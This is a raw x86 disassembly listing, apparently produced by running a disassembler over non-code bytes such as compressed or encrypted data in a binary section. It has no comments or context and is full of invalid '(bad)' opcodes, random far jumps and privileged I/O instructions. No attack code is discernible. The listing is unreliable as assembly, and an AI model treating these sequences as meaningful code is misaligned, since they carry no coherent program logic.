  41709f:	or     bh,cl
  4170a1:	in     al,dx
  4170a2:	mov    ecx,0xf6f3d3ef
  4170a7:	retf   0xe0b1
  4170aa:	retf   
  4170ab:	shr    dl,1
  4170ad:	mov    edi,0xede9becf
  4170b2:	mov    ebx,0xd6d3e0d6
  4170b7:	int3   
  4170b8:	(bad)  
  4170bb:	add    esp,edx
  4170bd:	pop    es
  4170be:	retf   
  4170bf:	loope  0x4170aa
  4170c1:	(bad)  
  4170c2:	fld1   
  4170c4:	scas   eax,DWORD PTR es:[edi]
  4170c5:	out    0xe1,eax
  4170c7:	sar    bl,0xb3
  4170ca:	mov    dl,0xf4
  4170cc:	in     al,dx
  4170cd:	retf   
  4170ce:	repnz enter 0x3cd,0xde
  4170d3:	ret    0xc201
  4170d6:	rol    BYTE PTR [ebx],cl
  4170d8:	out    0xda,eax
  4170da:	fld    DWORD PTR [edi]
  4170dc:	(bad)  
  4170dd:	(bad)  
  4170df:	out    dx,al
  4170e0:	clc    
  4170e1:	cld    
  4170e2:	mov    cl,0xc8
  4170e4:	jmp    0xc1c9:0xadd3c7f3
  4170eb:	(bad)  
  4170ec:	stc    
  4170ed:	mov    ch,0xf6
  4170ef:	push   ebp
  4170f1:	mov    ebp,0xedbcd2e2
  4170f6:	pop    es
  4170f7:	out    0x3,eax
  4170f9:	fcomp  st(1)
  4170fb:	jmp    0xe9c4:0xef0af9c5
  417102:	scas   al,BYTE PTR es:[edi]
  417103:	test   eax,0xf2d3b1a5
  417108:	in     eax,0xf4
  41710a:	int3   
  41710b:	fcmovnb st,st(4)
  41710d:	hlt    
  41710e:	out    dx,eax
  41710f:	cld    
  417110:	mov    cl,0xe8
  417112:	leave  
  417113:	out    dx,eax
  417114:	(bad)  
  417116:	(bad)  
  417117:	pop    es
  417118:	loope  0x4170fe
  41711a:	cli    
  41711b:	cmc    
  41711c:	out    0x8,eax
  41711e:	push   cs
  41711f:	fldln2 
  417121:	fdivr  st(2),st
  417123:	in     al,0xcc
  417125:	(bad)  
  417126:	repnz in eax,dx
  417128:	(bad)  
  417129:	(bad)  
  41712a:	fcmove st,st(1)
  41712c:	out    dx,eax
  41712d:	out    dx,eax
  41712e:	sti    
  41712f:	(bad)  
  417130:	icebp  
  417131:	repnz fucom st(7)
  417134:	stc    
  417135:	(bad)  
  417137:	mov    esp,0xc0f802cb
  41713c:	enter  0xec05,0x4
  417140:	push   cs
  417141:	fcomp  st(6)
  417143:	xlat   BYTE PTR ds:[ebx]
  417144:	mov    bh,0xc5
  417146:	in     eax,dx
  417147:	mov    ah,0xc2
  417149:	rcl    esp,0xc4
  41714c:	mov    cl,0xf3
  41714e:	idiv   BYTE PTR [ebx+eax*1-0x11463229]
  417155:	ret    0xfada
  417158:	xlat   BYTE PTR ds:[ebx]
  417159:	mov    ecx,0xde06dae6
  41715f:	add    ebp,ebp
  417161:	or     al,0xe4
  417163:	lock call 0xf3ee372b
  417169:	hlt    
  41716a:	mov    cl,0xd8
  41716c:	cmc    
  41716d:	repz lock cli 
  417170:	add    cl,al
  417172:	test   esp,0xbece5d3
  417178:	repnz stc 
  41717a:	std    
  41717b:	(bad)  
  41717d:	or     eax,0xd80fcbc3
  417182:	ret    
  417183:	lods   al,BYTE PTR ds:[esi]
  417184:	fucom  st(3)
  417186:	in     al,0xd1
  417188:	int3   
  417189:	not    esi
  41718b:	hlt    
  41718c:	in     al,dx
  41718d:	mov    bh,0xf7
  41718f:	cld    
  417190:	shl    ah,cl
  417192:	add    al,BYTE PTR [edx]
  417194:	std    
  417195:	aad    0xf0
  417197:	int3   
  417198:	fstp   st(5)
  41719a:	ret    
  41719b:	cli    
  41719c:	or     dl,ah
  41719e:	stc    
  41719f:	clc    
  4171a0:	jmp    0xe0b1:0xeec2a7cf
  4171a7:	mov    dl,0xe2
  4171a9:	shl    dl,cl
  4171ab:	rcl    eax,cl
  4171ad:	mov    ebx,0xbcd5dfff
  4171b2:	enter  0xc2ec,0x7
  4171b6:	cld    
  4171b7:	jmp    0x4171c0
  4171b9:	mov    BYTE PTR ds:0xc6fc0afe,0x6
  4171c0:	retf   
  4171c1:	or     eax,0xe8ccf7e6
  4171c6:	(bad)  
  4171c7:	in     al,0xcc
  4171c9:	int    0xdb
  4171cb:	fcmovu st,st(0)
  4171cd:	ror    ecx,cl
  4171cf:	(bad)  
  4171d1:	mov    ecx,0xc3c2c100
  4171d6:	shl    ebp,cl
  4171d8:	faddp  st(0),st
  4171da:	(bad)  
  4171dc:	(bad)  
  4171dd:	hlt    
  4171de:	fild   WORD PTR [ecx]
  4171e0:	dec    ecx
  4171e2:	jecxz  0x4171a9
  4171e4:	leave  
  4171e5:	rcl    cl,cl
  4171e7:	into   
  4171e8:	(bad)  
  4171ea:	jmp    0xeaf8:0xfebee8d1
  4171f1:	jmp    0xf9bd:0xbfdeb903
  4171f8:	rcr    dh,1
  4171fa:	test   DWORD PTR [edx],0xcf0606c9
  417200:	or     bl,al
  417202:	enter  0xe1ee,0xea
  417206:	(bad)  
  417207:	in     eax,dx
  417208:	mov    bh,0xee
  41720a:	cli    
  41720b:	retf   0xeacb
  41720e:	xlat   BYTE PTR ds:[ebx]
  41720f:	int3   
  417210:	cli    
  417211:	fnstsw WORD PTR [ebp-0x50bf846]
  417217:	out    0xc2,eax
  417219:	(bad)  
  41721a:	call   0xd07712e
  41721f:	loopne 0x4171fc
  417221:	jmp    0xc20a20ef
  417226:	iret   
  417227:	jmp    0xeff52420
  41722c:	jmp    0x4171e5
  41722e:	xlat   BYTE PTR ds:[ebx]
  41722f:	mov    dh,0xf9
  417231:	mov    eax,0xe1e6b9e2
  417236:	loopne 0x41720c
  417238:	inc    DWORD PTR [edi]
  41723a:	(bad)  
  41723c:	(bad)  
  41723d:	jmp    0x41722e
  41723f:	or     eax,0xadc5ecc8
  417244:	into   
  417245:	in     al,dx
  417246:	in     al,dx
  417247:	loopne 0x417244
  417249:	cmc    
  41724a:	sti    
  41724b:	int    0xcf
  41724d:	fsqrt  
  41724f:	mov    dl,0xd1
  417251:	cmc    
  417252:	neg    bl
  417254:	icebp  
  417255:	mov    ah,0xcd
  417257:	cli    
  417258:	shl    edx,cl
  41725a:	in     al,0xfa
  41725c:	add    eax,0xefcfc9d6
  417261:	or     eax,0xcbecafde
  417266:	int    0xf3
  417268:	loope  0x41723c
  41726a:	in     al,dx
  41726b:	icebp  
  41726c:	repz sar esi,1
  41726f:	mov    ebx,0xfcf5dfcc
  417274:	fld    QWORD PTR ds:0xc4f2e1f7
  41727a:	rcl    ch,0xa
  41727d:	push   es
  41727e:	iret   
  41727f:	add    al,0xd3
  417281:	jmp    0x417271
  417283:	out    0xdc,eax
  417285:	out    0xc3,eax
  417287:	mov    dh,0xec
  417289:	int    0xd2
  41728b:	(bad)  
  41728c:	hlt    
  41728d:	aam    0xd6
  41728f:	rcr    ebp,cl
  417291:	loope  0x417274
  417293:	fld    DWORD PTR [edi]
  417295:	stc    
  417296:	cld    
  417297:	stc    
  417298:	mov    ebp,0xd7e7d709
  41729d:	add    ch,al
  41729f:	jmp    0xf1ef4b84
  4172a4:	retf   0xf4e7
  4172a7:	hlt    
  4172a8:	ret    0xf2b1
  4172ab:	out    dx,eax
  4172ac:	cmc    
  4172ad:	in     eax,dx
  4172ae:	stc    
  4172af:	sar    dh,1
  4172b1:	(bad)  
  4172b3:	mov    edx,0xebc0ccc7
  4172b8:	repnz icebp 
  4172ba:	std    
  4172bb:	in     eax,0xe6
  4172bd:	jecxz  0x417283
  4172bf:	jecxz  0x4172a7
  4172c1:	int    0xe7
  4172c3:	repz mov bl,0xc5
  4172c6:	in     eax,dx
  4172c7:	retf   
  4172c8:	test   eax,0xf0c5e1a8
  4172cd:	jmp    0xfef9:0xeab5f4b7
  4172d4:	in     eax,dx
  4172d5:	aad    0xd0
  4172d7:	clc    
  4172d8:	cld    
  4172d9:	add    al,0xe6
  4172db:	out    dx,eax
  4172dc:	aad    0xf9
  4172de:	(bad)  
  4172e0:	fld    DWORD PTR [eax]
  4172e2:	stos   DWORD PTR es:[edi],eax
  4172e3:	shr    esp,1
  4172e5:	lods   al,BYTE PTR ds:[esi]
  4172e6:	mov    bl,0xc5
  4172e8:	jecxz  0x4172c3
  4172ea:	fcmovbe st,st(6)
  4172ec:	int3   
  4172ed:	mov    edx,0xd0e9d2c5
  4172f2:	xlat   BYTE PTR ds:[ebx]
  4172f3:	rol    bl,0xce
  4172f6:	shl    cl,cl
  4172f8:	(bad)  
  4172fa:	cmc    
  4172fb:	fmul   st,st(3)
  4172fd:	ror    BYTE PTR [eax],0xf3
  417300:	or     al,0x4
  417302:	shr    dh,cl
  417304:	mov    bh,0xb3
  417306:	mov    al,0xd6
  417308:	enter  0xe0e2,0xba
  41730c:	mov    edi,0xc8dce8de
  417311:	xlat   BYTE PTR ds:[ebx]
  417312:	add    dh,ch
  417314:	into   
  417315:	shl    ebx,cl
  417317:	out    0xfe,al
  417319:	mov    eax,0xf07e7c3
  41731e:	iret   
  41731f:	add    ebx,ebp
  417321:	add    esp,eax
  417323:	into   
  417324:	ret    
  417325:	mov    esi,0xf1f2aed1
  41732a:	rol    ch,1
  41732c:	in     al,0xf3
  41732e:	mov    bh,0xeb
  417330:	fcom   st(2)
  417332:	lock call ebx
  417335:	in     al,dx
  417336:	fcmovnbe st,st(5)
  417338:	in     eax,0xd7
  41733a:	pop    es
  41733b:	jmp    0x417305
  41733d:	fsub   st(2),st
  41733f:	jmp    0x417345
  417341:	retf   
  417342:	lods   al,BYTE PTR ds:[esi]
  417343:	stos   BYTE PTR es:[edi],al
  417344:	loopne 0x4172fd
  417346:	shl    edi,1
  417348:	cmc    
  417349:	mov    ebx,0xdfd4f0cd
  41734e:	sar    esp,1
  417350:	stc    
  417351:	fmul   st(1),st
  417353:	fild   WORD PTR [edi]
  417355:	mov    ah,0xbf
  417357:	(bad)  
  417358:	cld    
  417359:	out    0xc6,eax
  41735b:	retf   0xe0e
  41735e:	add    al,0xc6
  417360:	jmp    0x41733b
  417362:	out    0xf3,eax
  417364:	mov    bh,0xe0
  417366:	rcl    ecx,1
  417368:	ret    
  417369:	(bad)  
  41736b:	enter  0xd8f3,0xbb
  41736f:	mov    ebp,0xbe03e2ce
  417374:	(bad)  
  417375:	sar    BYTE PTR [ebx-0x3142705],1
  41737b:	fsincos 
  41737d:	call   0xf41b784a
  417382:	test   al,0xbe
  417384:	test   eax,0xb7c0efd6
  417389:	retf   
  41738a:	not    ch
  41738c:	cmc    
  41738d:	sar    dl,cl
  41738f:	out    dx,eax
  417390:	in     al,dx
  417391:	loope  0x41738a
  417393:	add    ch,bh
  417395:	repnz aad 0xba
  417398:	shl    esp,1
  41739a:	in     al,0xff
  41739c:	aad    0xe0
  41739e:	clc    
  41739f:	add    cl,bl
  4173a1:	in     eax,0xf2
  4173a3:	mov    edi,0xe4f1ddf6
  4173a8:	(bad)  
  4173a9:	shl    bl,0xcd
  4173ac:	(bad)
  4173af:	(bad)  
  4173b0:	fadd   QWORD PTR [ebx]
  4173b2:	fiadd  WORD PTR [edx]
  4173b4:	shl    bh,cl
  4173b6:	stc    
  4173b7:	int3   
  4173b8:	out    0xff,eax
  4173ba:	(bad)  
  4173bc:	or     dl,ch
  4173be:	or     bh,bl
  4173c0:	stc    
  4173c1:	push   cs
  4173c2:	mov    eax,0xe3e4f6ac
  4173c7:	mov    cl,0xea
  4173c9:	(bad)  
  4173ca:	in     al,dx
  4173cb:	out    dx,eax
  4173cc:	cli    
  4173cd:	mov    esi,0xe103d9eb
  4173d2:	jecxz  0x4173c0
  4173d4:	fild   DWORD PTR [eax]
  4173d6:	add    al,0xd9
  4173d8:	stc    
  4173d9:	or     ebp,esi
  4173db:	test   bl,0xdb
  4173de:	(bad)
  4173e1:	retf   0xcde9
  4173e4:	int3   
  4173e5:	jecxz  0x4173ab
  4173e7:	lods   al,BYTE PTR ds:[esi]
  4173e8:	hlt    
  4173e9:	out    0xe0,eax
  4173eb:	in     al,dx
  4173ec:	jmp    0x300599d
  4173f1:	repnz in al,dx
  4173f3:	cmc    
  4173f4:	idiv   ecx
  4173f6:	sti    
  4173f7:	out    0xfb,al
  4173f9:	ret    
  4173fa:	in     eax,0xcb
  4173fc:	fcomi  st,st(6)
  4173fe:	retf   0x6fa
  417401:	in     eax,0xb8
  417403:	in     al,dx
  417404:	mov    dl,0xd0
  417406:	rcr    bl,1
  417408:	(bad)  
  417409:	mov    bl,0xb1
  41740b:	test   dh,0xf1
  41740e:	mov    bh,0xbf
  417410:	sti    
  417411:	mov    edx,0xbedcf5dc
  417416:	fidivr WORD PTR [edx-0x181e0308]
  41741c:	hlt    
  41741d:	dec    BYTE PTR [ecx]
  41741f:	(bad)  
  417420:	call   0xa9356217
  417425:	lds    esi,FWORD PTR [edi-0x2e120b35]
  41742b:	cli    
  41742c:	mov    dh,0xe4
  41742e:	int    0xb2
  417430:	sti    
  417431:	fbstp  TBYTE PTR [edi-0x3f423c41]
  417437:	xlat   BYTE PTR ds:[ebx]
  417438:	(bad)  
  417439:	(bad)  
  41743a:	lock shl al,0x2
  41743e:	or     eax,ebp
  417440:	push   cs
  417441:	push   es
  417442:	test   eax,0xf1e5cfc5
  417447:	into   
  417448:	mov    ah,0xa8
  41744a:	in     al,dx
  41744b:	int    0xdb
  41744d:	shl    ch,1
  41744f:	out    dx,al
  417450:	shr    ecx,cl
  417452:	fcmovnbe st,st(6)
  417454:	(bad)  
  417456:	ret    
  417457:	push   es
  417458:	add    BYTE PTR ds:0xefddfddb,al
  41745e:	fucomi st,st(2)
  417460:	or     dh,dl
  417462:	stos   DWORD PTR es:[edi],eax
  417463:	call   0xf0284632
  417468:	(bad)  
  417469:	loopne 0x417466
  41746b:	retf   0xd6fa
  41746e:	in     al,dx
  41746f:	fsubr  st,st(4)
  417471:	(bad)  
  417472:	int3   
  417473:	ret    0xfcc3
  417476:	mov    ebp,0xc600e3d0
  41747b:	in     al,0xc5
  41747d:	(bad)  
  41747e:	in     eax,0xed
  417480:	stc    
  417481:	fdivr  st(0),st
  417483:	out    dx,al
  417484:	mov    al,0xac
  417487:	lods   eax,DWORD PTR ds:[esi]
  417488:	repnz mov bl,0xf0
  41748b:	(bad)  
  41748c:	jmp    0xf30e2f7b
  417491:	neg    ah
  417493:	not    ah
  417495:	jecxz  0x41745e
  417497:	(bad)  
  417498:	(bad)  
  41749a:	cld    
  41749b:	(bad)  
  41749c:	(bad)  
  41749d:	fadd   DWORD PTR [ecx]
  41749f:	fdivr  st(2),st
  4174a1:	jmp    0x417492
  4174a3:	leave  
  4174a4:	test   edx,0xe6f4c4ec
  4174aa:	aam    0xb6
  4174ac:	jmp    0x417486
  4174ae:	jmp    0xe1f7:0xc2fcbad4
  4174b5:	lock repz icebp 
  4174b8:	add    ebp,edi
  4174ba:	les    eax,FWORD PTR ds:0xfd0fc9ca
  4174c0:	loope  0x4174c3
  4174c2:	test   al,0xd1
  4174c4:	repz int3 
  4174c6:	fmul   st(2),st
  4174c8:	mov    al,0xca
  4174ca:	icebp  
  4174cb:	into   
  4174cc:	les    esi,FWORD PTR [edi+esi*8-0x37472943]
  4174d3:	add    cl,bh
  4174d5:	add    bl,dl
  4174d7:	sti    
  4174d8:	(bad)  
  4174d9:	add    eax,eax
  4174db:	jmp    0xcada:0x807c7da
  4174e2:	out    0xbd,eax
  4174e4:	retf   
  4174e5:	call   0xc7372797
  4174ea:	mov    edx,0xece4d0c4
  4174ef:	jmp    0xd2f9:0xe7b8bbde
  4174f6:	push   es
  4174f7:	push   es
  4174f8:	in     eax,0x9
  4174fa:	jmp    0xeb427806
  4174ff:	pop    es
  417500:	rol    esp,cl
  417502:	call   0xb6fe35f6
  417507:	(bad)  
  417508:	ret    
  417509:	loop   0x4174d4
  41750b:	repnz mov cl,0xe9
  41750e:	out    dx,eax
  41750f:	xlat   BYTE PTR ds:[ebx]
  417510:	out    dx,eax
  417511:	cld    
  417512:	add    edi,edx
  417514:	fistp  QWORD PTR [esi-0x3f011f10]
  41751a:	mov    edi,0xefe5d5c4
  41751f:	sti    
  417520:	add    eax,0xc1c1af11
  417525:	jmp    0xebb6:0xd0d7e0ed
  41752c:	(bad)  
  41752e:	aad    0xfc
  417530:	enter  0xfad9,0xee
  417534:	shr    dh,cl
  417536:	sti    
  417537:	rcl    cl,1
  417539:	fild   WORD PTR ds:0xa0afb06
  41753f:	std    
  417540:	(bad)  
  417541:	repz mov eax,0xe2a4b3e2
  417547:	loope  0x417509
  417549:	rcl    edi,1
  41754b:	repnz retf 
  41754d:	fdivr  st,st(1)
  41754f:	mov    edi,0xd8e0b9dc
  417554:	std    
  417555:	xlat   BYTE PTR ds:[ebx]
  417556:	loop   0x417553
  417558:	or     ebx,edi
  41755a:	jmp    0xdfe2:0xfaee05d8
  417561:	or     bh,bl
  417563:	loop   0x417558
  417565:	imul   ch
  417567:	int    0xf1
  417569:	in     eax,0xfa
  41756b:	mov    ch,0xf2
  41756d:	mov    dh,0xd5
  41756f:	cli    
  417570:	mov    esi,0xbde3fed4
  417575:	mov    DWORD PTR [edi],0xd7dd0507
  41757b:	loope  0x417572
  41757d:	out    dx,eax
  41757e:	loopne 0x41754d
  417580:	std    
  417581:	in     eax,0xd0
  417583:	lods   al,BYTE PTR ds:[esi]
  417584:	int3   
  417585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417586:	leave  
  417587:	ret    0xcaee
  41758a:	shl    edx,0xce
  41758d:	jmp    0xeebd:0xbeeaf3fc
  417594:	in     eax,dx
  417595:	(bad)  
  417597:	rcr    al,0xdd
  41759a:	or     ecx,ebx
  41759c:	(bad)  
  41759d:	(bad)  
  41759e:	aad    0xcf
  4175a0:	(bad)  [ebx]
  4175a2:	ret    
  4175a3:	test   al,0xc1
  4175a5:	loope  0x41756d
  4175a7:	retf   0xd3cb
  4175aa:	in     al,0xe0
  4175ac:	(bad)  
  4175ad:	sar    cl,cl
  4175af:	int3   
  4175b0:	out    dx,al
  4175b1:	jmp    0xd0d0:0xe6dff4cf
  4175b8:	push   es
  4175b9:	fimul  WORD PTR [ecx]
  4175bb:	hlt    
  4175bc:	(bad)  
  4175bd:	enter  0x2c4,0xe6
  4175c1:	clc    
  4175c2:	mov    eax,0xc5e2ebc3
  4175c7:	in     eax,0xb7
  4175c9:	mov    bl,0xb7
  4175cb:	scas   al,BYTE PTR es:[edi]
  4175cc:	lods   eax,DWORD PTR ds:[esi]
  4175cd:	fucomp st(2)
  4175cf:	test   ah,0xee
  4175d2:	fidivr WORD PTR [edi+eax*1-0x2c392d04]
  4175d9:	retf   
  4175da:	add    al,BYTE PTR [ecx]
  4175dc:	or     bl,ch
  4175de:	loopne 0x4175ea
  4175e0:	add    eax,esp
  4175e2:	rol    esi,0xd0
  4175e5:	leave  
  4175e6:	(bad)  
  4175e8:	repz ret 0xb0fa
  4175ec:	out    0xea,eax
  4175ee:	int    0xb4
  4175f0:	jmp    0xf7e7:0xdff0d2ba
  4175f7:	mov    esp,0xf6f5c4db
  4175fc:	in     eax,0xc8
  4175fe:	call   0xec53490a
  417603:	out    0xde,al
  417605:	mov    ebp,0xe5f1ebd3
  41760a:	test   dl,0xea
  41760d:	jmp    0xd7df:0xd2d2c8bb
  417614:	stc    
  417615:	sar    BYTE PTR [ebp+0x5f0f7e5],0xda
  41761c:	in     al,0xf
  41761e:	cmc    
  41761f:	out    dx,al
  417620:	in     eax,0xcb
  417622:	mov    dl,0xe8
  417624:	loope  0x4175d5
  417626:	jmp    0xf6f3:0xe0ced3c7
  41762d:	aad    0xe8
  41762f:	mov    esp,0xf2e8ca
  417634:	dec    ah
  417636:	stc    
  417637:	cli    
  417638:	add    ecx,ebx
  41763a:	ret    0xdf
  41763d:	loopne 0x417649
  41763f:	dec    ch
  417641:	shr    BYTE PTR [esi-0x1e525718],0xce
  417648:	lods   eax,DWORD PTR ds:[esi]
  417649:	(bad)
  41764c:	enter  0xbbf5,0xe4
  417650:	int3   
  417651:	clc    
  417652:	mov    bh,0xcc
  417654:	mov    ecx,0xdb0bc107
  417659:	cld    
  41765a:	add    ch,ah
  41765c:	fsub   st,st(7)
  41765e:	retf   
  41765f:	jmp    0xc1ff8948
  417664:	out    0xf6,al
  417666:	shl    ebp,1
  417668:	div    DWORD PTR [edi-0x19390b12]
  41766e:	jmp    0x41764b
  417670:	clc    
  417671:	int    0xf8
  417673:	add    eax,eax
  417675:	rcr    al,0xc5
  417678:	fucom  st(0)
  41767a:	loop   0x417652
  41767c:	out    0xc9,al
  41767e:	jmp    0xad208590
  417683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417684:	mov    al,0xe1
  417686:	stos   DWORD PTR es:[edi],eax
  417687:	lods   eax,DWORD PTR ds:[esi]
  417688:	jecxz  0x417671
  41768a:	(bad)  
  41768b:	(bad)  
  41768c:	mov    edx,0xf0bdbeb6
  417691:	shl    ch,1
  417693:	ret    0xfcc2
  417696:	hlt    
  417697:	stc    
  417698:	push   es
  417699:	mov    eax,0xdee5e6f1
  41769e:	push   cs
  41769f:	add    DWORD PTR ds:0xbed1df11,ecx
  4176a5:	shl    DWORD PTR [ebp-0x4d360e53],1
  4176ab:	div    DWORD PTR [ebp-0x460b2133]
  4176b1:	cmc    
  4176b2:	inc    BYTE PTR [ebx]
  4176b4:	ret    0xf3fc
  4176b7:	in     al,dx
  4176b8:	or     esp,edx
  4176ba:	(bad)  
  4176bc:	fcmovu st,st(5)
  4176be:	or     eax,0xb9fded0b
  4176c3:	mov    esi,0xc3cbafd7
  4176c8:	enter  0xe5e5,0xda
  4176cc:	enter  0xccd7,0xeb
  4176d0:	fdiv   st,st(2)
  4176d2:	mov    ebx,0xbdfad3ef
  4176d7:	mov    edx,0xfa04e6ff
  4176dc:	les    eax,FWORD PTR [ebx]
  4176de:	les    edx,FWORD PTR [ebx]
  4176e0:	call   0xcceb36ee
  4176e5:	lock repnz shl dh,1
  4176e9:	jmp    0x4176d8
  4176eb:	call   0xef2f68b8
  4176f0:	mov    edx,0xe0f9e1c9
  4176f5:	cli    
  4176f6:	cld    
  4176f7:	out    0xe6,al
  4176f9:	jecxz  0x417705
  4176fb:	or     DWORD PTR [ebx+eiz*8],eax
  4176fe:	retf   0xa09
  417701:	(bad)  
  417702:	leave  
  417703:	jmp    0xdd0253eb
  417708:	jmp    0x4176d1
  41770a:	mov    edx,0xcfb7f1b9
  41770f:	mov    edi,0xfbf4d6eb
  417714:	sar    ebp,0x7
  417717:	fst    st(6)
  417719:	sar    ah,1
  41771b:	shl    bh,1
  41771d:	add    al,BYTE PTR [ecx]
  41771f:	int3   
  417720:	retf   0xaac0
  417723:	in     al,0xb3
  417725:	ret    0xd5e0
  417728:	test   eax,0xf2caf4db
  41772d:	shr    ebx,cl
  41772f:	shr    esi,cl
  417731:	shr    esp,1
  417733:	sti    
  417734:	mov    ebp,0x400e2c7
  417739:	or     ah,ch
  41773b:	call   0xdb113f49
  417740:	les    ecx,FWORD PTR [ecx]
  417742:	out    dx,eax
  417743:	int3   
  417744:	int    0xe1
  417746:	repnz aam 0xeb
  417749:	ror    al,cl
  41774b:	fdiv   st,st(6)
  41774d:	out    dx,eax
  41774e:	int3   
  41774f:	(bad)  
  417750:	(bad)  
  417752:	loop   0x41774a
  417754:	(bad)  
  417756:	sti    
  417757:	(bad)  
  417758:	or     dl,al
  41775a:	mov    edi,0xcfe0f90f
  41775f:	jmp    0x41774d
  417761:	cld    
  417762:	(bad)  
  417764:	leave  
  417765:	repnz mov bh,0xe7
  417768:	lods   eax,DWORD PTR ds:[esi]
  417769:	(bad)  
  41776a:	in     eax,0xb6
  41776c:	not    dl
  41776e:	mov    ah,0xcc
  417770:	shr    eax,cl
  417772:	aam    0xbf
  417774:	ret    0xf0c6
  417777:	mov    edx,0xd8eaded9
  41777c:	retf   
  41777d:	(bad)  
  41777e:	jmp    ecx
  417780:	enter  0xf1e8,0xbe
  417784:	jmp    0x417751
  417786:	mov    cl,0xeb
  417789:	cli    
  41778a:	cli    
  41778b:	mov    al,0xec
  41778d:	mov    eax,0xb4b1e8c4
  417792:	fdivr  st,st(1)
  417794:	std    
  417795:	add    dh,dh
  417797:	add    al,0x1
  417799:	aad    0xc4
  41779b:	fadd   QWORD PTR [ecx]
  41779d:	sar    dl,0x6
  4177a0:	out    0xc4,al
  4177a2:	mov    bl,0xcf
  4177a4:	enter  0xc7ac,0xea
  4177a8:	loopne 0x417775
  4177aa:	in     eax,0xca
  4177ac:	mov    al,0xc5
  4177ae:	aad    0xd1
  4177b0:	add    al,bl
  4177b2:	loope  0x4177bb
  4177b4:	mov    esi,0xe2f3f3c1
  4177b9:	repnz cld 
  4177bb:	push   edi
  4177bd:	into   
  4177be:	int    0xf9
  4177c0:	(bad)  
  4177c2:	repz (bad) 
  4177c5:	(bad)  
  4177c6:	iret   
  4177c7:	out    0xc6,al
  4177c9:	rcr    cl,cl
  4177cb:	enter  0xffc9,0xce
  4177cf:	mov    dl,0xd7
  4177d1:	add    edx,esi
  4177d3:	fadd   st(7),st
  4177d5:	rol    BYTE PTR [edi],cl
  4177d7:	mul    bh
  4177d9:	loope  0x4177b8
  4177db:	loopne 0x4177e5
  4177dd:	hlt    
  4177de:	or     ebx,ebp
  4177e0:	iret   
  4177e1:	std    
  4177e2:	lods   eax,DWORD PTR ds:[esi]
  4177e3:	mov    dl,0xec
  4177e5:	(bad)  
  4177e7:	repnz retf 
  4177e9:	call   0xe5284fb7
  4177ee:	cli    
  4177ef:	repnz rcr ebp,cl
  4177f2:	push   ebx
  4177f4:	loop   0x4177d9
  4177f6:	mov    esp,0xd0ddd4fa
  4177fb:	cli    
  4177fc:	test   BYTE PTR [ebx],0x2
  4177ff:	iret   
  417800:	dec    ah
  417802:	iret   
  417803:	rol    bh,0xf2
  417806:	mov    dl,0xd6
  417808:	in     eax,dx
  417809:	int3   
  41780a:	iret   
  41780b:	mov    ah,0xc7
  41780d:	aad    0xd5
  41780f:	(bad)  
  417810:	in     eax,dx
  417811:	mov    ebx,0x207b9bd
  417816:	(bad)  
  417818:	add    dh,al
  41781a:	in     al,0xfd
  41781c:	mov    ebp,0x113efc7
  417821:	add    al,0xae
  417823:	lods   eax,DWORD PTR ds:[esi]
  417824:	mov    dl,0xb7
  417826:	mov    bh,0xec
  417828:	out    dx,al
  417829:	out    dx,al
  41782a:	imul   bl
  41782c:	cli    
  41782d:	out    0xec,al
  41782f:	icebp  
  417830:	icebp  
  417831:	in     al,dx
  417832:	div    esi
  417834:	add    DWORD PTR [esi],eax
  417836:	add    al,0xc5
  417838:	rol    BYTE PTR [edi],1
  41783a:	mov    edi,0x7dad6f4
  41783f:	int    0xe6
  417841:	adc    ecx,esp
  417843:	out    dx,al
  417844:	jmp    0xec0248fb
  417849:	out    dx,eax
  41784a:	call   0xbe2f514a
  41784f:	int3   
  417850:	out    dx,al
  417851:	call   0x71c4142
  417856:	mov    ebp,0x8e2dac1
  41785b:	rcr    dh,0xfa
  41785e:	or     eax,0xefe6ef13
  417863:	(bad)  
  417864:	(bad)  
  417865:	les    ebp,FWORD PTR [ebp-0x482b0437]
  41786b:	stc    
  41786c:	mov    eax,0xfcd4d8f9
  417871:	mov    ebp,0xf0f7f102
  417876:	repnz aam 0xff
  417879:	xlat   BYTE PTR ds:[ebx]
  41787a:	add    cl,cl
  41787c:	inc    DWORD PTR [ecx]
  41787e:	inc    BYTE PTR [edi]
  417880:	cli    
  417881:	or     ch,bl
  417883:	mov    eax,0xadf1ebbd
  417888:	cli    
  417889:	ret    0xcdf3
  41788c:	repnz test esi,0xced2c8b6
  417893:	cmc    
  417894:	fistp  QWORD PTR [eax-0x1d270b39]
  41789a:	(bad)  
  41789c:	add    BYTE PTR [eax],cl
  41789e:	or     eax,ebp
  4178a0:	iret   
  4178a1:	jmp    0xc5113899
  4178a6:	(bad)  
  4178a7:	jmp    0xd1ee:0xb5bac2d0
  4178ae:	cli    
  4178af:	mov    ebp,0xbcc1f1cb
  4178b4:	neg    bh
  4178b6:	in     al,dx
  4178b7:	add    esi,edx
  4178b9:	(bad)  
  4178ba:	out    0xd9,al
  4178bc:	mov    eax,0xdd0107d5
  4178c2:	in     al,dx
  4178c3:	repnz rol edi,1
  4178c6:	loop   0x4178bf
  4178c8:	into   
  4178c9:	shl    BYTE PTR [esi-0x201a0514],0xfc
  4178d0:	(bad)  
  4178d2:	mov    esi,0xdddffbe2
  4178d7:	add    esi,ecx
  4178d9:	fcom   st(1)
  4178db:	retf   
  4178dc:	in     al,0xea
  4178de:	(bad)  
  4178df:	(bad)  
  4178e1:	into   
  4178e2:	lods   al,BYTE PTR ds:[esi]
  4178e3:	mov    ebp,0xeeb2f1d3
  4178e8:	in     al,dx
  4178e9:	rol    cl,0xc5
  4178ec:	clc    
  4178ed:	(bad)
  4178f0:	aam    0xbc
  4178f2:	jecxz  0x4178f1
  4178f4:	idiv   DWORD PTR [eax-0x21212e03]
  4178fa:	xlat   BYTE PTR ds:[ebx]
  4178fb:	jmp    0xc8427b00
  417900:	ror    DWORD PTR [ecx],cl
  417902:	(bad)  
  417903:	call   0xe4344bd6
  417908:	shl    ebp,0xd8
  41790b:	(bad)  
  41790c:	xlat   BYTE PTR ds:[ebx]
  41790d:	rcl    ebx,1
  41790f:	aad    0xf9
  417911:	int3   
  417912:	add    dh,dh
  417914:	(bad)  
  417915:	mov    esi,0xead505f0
  41791a:	in     eax,0xc8
  41791c:	sti    
  41791d:	cld    
  41791e:	sti    
  41791f:	in     eax,dx
  417920:	cld    
  417921:	pinsrw mm0,eax,0xe5
  417925:	(bad)  
  417927:	(bad)  
  417928:	repnz jmp 0xd4bd:0xe9d0cdc7
  417930:	mov    edx,0xe1dafad6
